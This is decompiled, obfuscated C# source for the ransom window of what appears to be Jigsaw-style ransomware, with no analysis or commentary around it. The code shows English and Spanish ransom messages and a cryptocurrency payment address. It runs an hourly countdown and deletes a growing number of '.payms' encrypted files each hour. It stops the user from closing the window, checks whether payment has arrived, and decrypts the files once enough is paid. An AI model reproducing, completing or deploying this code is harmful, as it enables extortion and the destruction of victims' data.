using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using ns0;

namespace Main;

public class FormGame : Form
{
	private static int int_0;

	private static int int_1;

	private const double double_0 = 1.1;

	private static int int_2;

	private IContainer icontainer_0;

	private Label label_0;

	private Timer timer_0;

	private Label label_1;

	private TextBox textBox_0;

	private Button button_0;

	private Button button_1;

	private Timer timer_1;

	private Label label_2;

	private Label label_3;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams obj = Delegate117.smethod_0(this);
			Delegate241.smethod_0(obj, Delegate136.smethod_0(obj) | 0x200);
			return obj;
		}
	}

	public FormGame()
	{
		method_6();
	}

	private void method_0(object sender, EventArgs e)
	{
		Delegate168.smethod_0(this, bool_0: false);
		Delegate216.smethod_0(this, bool_0: false);
		Delegate115.smethod_0(this, (FormStartPosition)1);
		Class11.smethod_4((Form)(object)this);
		Delegate21.smethod_0(timer_0, 125);
		Delegate232.smethod_0(timer_0, bool_0: true);
		Delegate167.smethod_0(label_0, "");
		Delegate167.smethod_0(label_1, Class2.string_14);
		Delegate177.smethod_0(label_1, bool_0: false);
		Delegate186.smethod_0(textBox_0, bool_0: true);
		Delegate167.smethod_0(textBox_0, smethod_2());
		Delegate177.smethod_0(textBox_0, bool_0: false);
		Delegate177.smethod_0(button_0, bool_0: false);
		Delegate177.smethod_0(button_1, bool_0: false);
		Delegate177.smethod_0(label_2, bool_0: false);
		Delegate232.smethod_0(timer_1, bool_0: false);
		Delegate177.smethod_0(label_3, bool_0: false);
		if (smethod_0())
		{
			smethod_1(1000);
		}
	}

	private static bool smethod_0()
	{
		string string_ = Delegate22.smethod_0(Class2.string_12, "dr");
		if (Delegate192.smethod_0(string_))
		{
			return true;
		}
		Delegate53.smethod_0(string_, "21");
		return false;
	}

	private static void smethod_1(int int_3)
	{
		try
		{
			int num = 0;
			HashSet<string>.Enumerator enumerator_ = Delegate34.smethod_0(Class7.smethod_1());
			try
			{
				while (Delegate103.smethod_0(ref enumerator_))
				{
					string string_ = Delegate98.smethod_0(ref enumerator_);
					if (num == int_3)
					{
						break;
					}
					Delegate81.smethod_0(Delegate173.smethod_0(string_, ".payms"));
					num++;
				}
			}
			finally
			{
				((IDisposable)enumerator_).Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	private static string smethod_2()
	{
		string string_ = Delegate22.smethod_0(Class2.string_12, "Address.txt");
		if (Delegate192.smethod_0(string_))
		{
			return Delegate149.smethod_0(string_);
		}
		HashSet<string> hashSet = Delegate210.smethod_0();
		List<string>.Enumerator enumerator_ = Delegate201.smethod_0(Delegate59.smethod_0(Class12.vanityAddresses, new string[1] { Delegate179.smethod_0() }, StringSplitOptions.RemoveEmptyEntries).ToList());
		try
		{
			while (Delegate174.smethod_0(ref enumerator_))
			{
				string object_ = Delegate204.smethod_0(ref enumerator_);
				Delegate61.smethod_0(hashSet, Delegate120.smethod_0(object_));
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
		string text = hashSet.OrderBy((string string_0) => Delegate13.smethod_0()).FirstOrDefault();
		Delegate53.smethod_0(string_, text);
		return text;
	}

	private void method_1(object sender, FormClosingEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		Delegate76.smethod_0(e, bool_0: true);
		Delegate159.smethod_0((IWin32Window)(object)this, "You are about to make a very bad decision. Are you sure about it? Usted está a punto de hacer una decisión muy mala. ¿Estas seguro de eso?");
	}

	private void method_2(object sender, EventArgs e)
	{
		string string_ = Class2.string_13;
		Delegate167.smethod_0(label_0, Delegate173.smethod_0(Delegate88.smethod_0(string_, 0, int_2), "_"));
		int_2++;
		if (int_2 == Delegate107.smethod_0(string_) + 1)
		{
			Delegate232.smethod_0(timer_0, bool_0: false);
			Delegate177.smethod_0(label_1, bool_0: true);
			Delegate177.smethod_0(textBox_0, bool_0: true);
			Delegate177.smethod_0(button_0, bool_0: true);
			Delegate177.smethod_0(button_1, bool_0: true);
			Delegate177.smethod_0(label_2, bool_0: true);
			Delegate232.smethod_0(timer_1, bool_0: true);
			Delegate177.smethod_0(label_3, bool_0: true);
			int_0 = 3600;
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double num = Class4.smethod_0();
			int num2 = (int)(Class4.smethod_1(smethod_2()) * num);
			if (num2 > Class2.int_2)
			{
				Delegate129.smethod_0(timer_1);
				Delegate197.smethod_0(button_0, bool_0: false);
				Delegate209.smethod_0(button_0, Delegate12.smethod_0());
				Delegate167.smethod_0(button_0, "Great job, I'm decrypting your files...");
				Delegate146.smethod_0((IWin32Window)(object)this, "Decrypting your files. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
				Class7.smethod_6(".payms");
				Class5.smethod_3();
			}
			else if (num2 > 0)
			{
				Delegate209.smethod_0(button_0, Delegate44.smethod_0());
				Delegate167.smethod_0(button_0, "You did not sent me enough! Try again! No has enviado suficiente! ¡Inténtalo de nuevo!");
			}
			else
			{
				Delegate209.smethod_0(button_0, Delegate44.smethod_0());
				Delegate167.smethod_0(button_0, "You haven't made payment yet! Try again! Usted no ha realizado el pago todavía! ¡Inténtalo de nuevo!");
			}
		}
		catch (Exception object_)
		{
			Delegate172.smethod_0(Delegate55.smethod_0(object_));
			Delegate167.smethod_0(button_0, "Are you connected to the internet? Try again! ¿Está conectado a Internet? ¡Inténtalo de nuevo!");
			Delegate209.smethod_0(button_0, Delegate44.smethod_0());
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		Delegate56.smethod_1(new FormEncryptedFiles(), (IWin32Window)(object)this);
	}

	private void method_5(object sender, EventArgs e)
	{
		if (int_0 > 0)
		{
			int_0--;
			int num = int_0 / 60;
			int num2 = int_0 % 60;
			Delegate167.smethod_0(label_2, Delegate40.smethod_0(num, ":", num2));
		}
		else
		{
			int_0 = 3600;
			int num3 = (int)Delegate196.smethod_0(1.1, int_1);
			Delegate167.smethod_0(label_3, Delegate157.smethod_0(num3, " files will be deleted"));
			int_1++;
			smethod_1(num3);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			Delegate133.smethod_0(icontainer_0);
		}
		Delegate193.smethod_0(this, disposing);
	}

	private void method_6()
	{
		//IL_0414: Unknown result type (might be due to invalid IL or missing references)
		//IL_041e: Expected O, but got Unknown
		icontainer_0 = Delegate166.smethod_0();
		label_0 = Delegate36.smethod_0();
		timer_0 = Delegate171.smethod_0(icontainer_0);
		label_1 = Delegate36.smethod_0();
		textBox_0 = Delegate26.smethod_0();
		button_0 = Delegate112.smethod_0();
		button_1 = Delegate112.smethod_0();
		timer_1 = Delegate171.smethod_0(icontainer_0);
		label_2 = Delegate36.smethod_0();
		label_3 = Delegate36.smethod_0();
		Delegate19.smethod_0(this);
		Delegate52.smethod_0(label_0, bool_0: true);
		Delegate209.smethod_0(label_0, Delegate190.smethod_0());
		Delegate170.smethod_0(label_0, Delegate39.smethod_0("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, 0));
		Delegate126.smethod_0(label_0, Delegate190.smethod_0());
		Delegate11.smethod_0(label_0, new Point(24, 29));
		Delegate94.smethod_1(label_0, "labelWelcome");
		Delegate101.smethod_0(label_0, new Size(218, 16));
		Delegate16.smethod_0(label_0, 0);
		Delegate167.smethod_0(label_0, "I want to play a game");
		Delegate152.smethod_0(timer_0, method_2);
		Delegate209.smethod_0(button_1, Delegate127.smethod_0());
		Delegate11.smethod_0(button_1, new Point(40, 285));
		Delegate94.smethod_1(button_1, "buttonViewEncryptedFiles");
		Delegate101.smethod_0(button_1, new Size(300, 30));
		Delegate16.smethod_0(button_1, 1);
		Delegate167.smethod_0(button_1, "View encrypted files. Ver Archivos Encriptados.");
		Delegate30.smethod_0(button_1, bool_0: false);
		Delegate92.smethod_0(button_1, method_4);
		Delegate52.smethod_0(label_1, bool_0: true);
		Delegate209.smethod_0(label_1, Delegate190.smethod_0());
		Delegate170.smethod_0(label_1, Delegate39.smethod_0("Lucida Console", 12f, (FontStyle)1, (GraphicsUnit)3, 0));
		Delegate126.smethod_0(label_1, Delegate145.smethod_0());
		Delegate11.smethod_0(label_1, new Point(37, 320));
		Delegate94.smethod_1(label_1, "labelTask");
		Delegate101.smethod_0(label_1, new Size(300, 20));
		Delegate16.smethod_0(label_1, 2);
		Delegate167.smethod_0(label_1, "All you have to do...");
		Delegate11.smethod_0(textBox_0, new Point(12, 490));
		Delegate94.smethod_1(textBox_0, "textBoxAddress");
		Delegate101.smethod_0(textBox_0, new Size(350, 20));
		Delegate16.smethod_0(textBox_0, 4);
		Delegate167.smethod_0(textBox_0, "12Xspzstah37626slkwKhsKSHA");
		Delegate209.smethod_0(button_0, Delegate45.smethod_0());
		Delegate11.smethod_0(button_0, new Point(12, 515));
		Delegate94.smethod_1(button_0, "buttonCheckPayment");
		Delegate101.smethod_0(button_0, new Size(350, 40));
		Delegate16.smethod_0(button_0, 5);
		Delegate167.smethod_0(button_0, "I made a payment, now give me back my files! Ya pague. Regresame los archivos!");
		Delegate30.smethod_0(button_0, bool_0: false);
		Delegate92.smethod_0(button_0, method_3);
		Delegate62.smethod_0(this, new SizeF(6f, 13f));
		Delegate83.smethod_0(this, (AutoScaleMode)1);
		Delegate128.smethod_0(this, (Image)(object)Class12.pic1);
		Delegate86.smethod_0(this, new Size(1000, 600));
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)label_3);
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)label_2);
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)button_1);
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)button_0);
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)textBox_0);
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)label_1);
		Delegate102.smethod_0(Delegate95.smethod_0(this), (Control)(object)label_0);
		Delegate94.smethod_0(this, "FormGame");
		Delegate90.smethod_0(this, new FormClosingEventHandler(method_1));
		Delegate242.smethod_0(this, method_0);
		Delegate155.smethod_0(this, bool_0: false);
		Delegate106.smethod_0(this);
	}
}
